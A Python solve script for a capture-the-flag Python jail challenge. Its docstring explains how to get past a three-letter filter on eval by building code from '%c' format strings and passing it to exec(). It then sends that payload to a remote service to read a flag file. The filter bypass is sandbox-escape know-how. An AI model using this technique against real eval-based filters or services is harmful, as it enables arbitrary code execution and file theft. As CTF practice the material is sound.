#!/usr/bin/env python3
"""
not-so-pyfk — AlpacaHack Daily 2026-08-09

jail.py: eval(code) where code must be ASCII and use at most 3 distinct
alphabetic characters (non-letters unlimited). The flag is /flag-<md5>.txt.

Trick: '%c' % N yields any character using only the letter 'c', so
('%c'*N) % (ords...) builds an arbitrary string with just 'c'. Feed that to
exec() (letters e, x, c). Total distinct letters = {c, e, x} = 3. The code
INSIDE the generated string never appears in the source, so it can use any
identifiers:  import glob; print(open(glob.glob('/flag*')[0]).read())

Usage: python3 solve.py <host> <port>
"""
import socket, sys, time, re

HOST, PORT = sys.argv[1], int(sys.argv[2])
inner = "import glob\nprint(open(glob.glob('/flag*')[0]).read())"
payload = "exec(('%c'*" + str(len(inner)) + ")%(" + ",".join(str(ord(c)) for c in inner) + "))"

assert payload.isascii() and len({c for c in payload if c.isalpha()}) <= 3

s = socket.create_connection((HOST, PORT), timeout=20); s.settimeout(20)
time.sleep(0.3)
s.sendall(payload.encode() + b"\n")
buf = b""
try:
    while True:
        d = s.recv(4096)
        if not d: break
        buf += d
except Exception:
    pass
s.close()
m = re.search(rb"Alpaca\{[^}]*\}", buf)
print(m.group(0).decode() if m else buf.decode(errors="replace"))
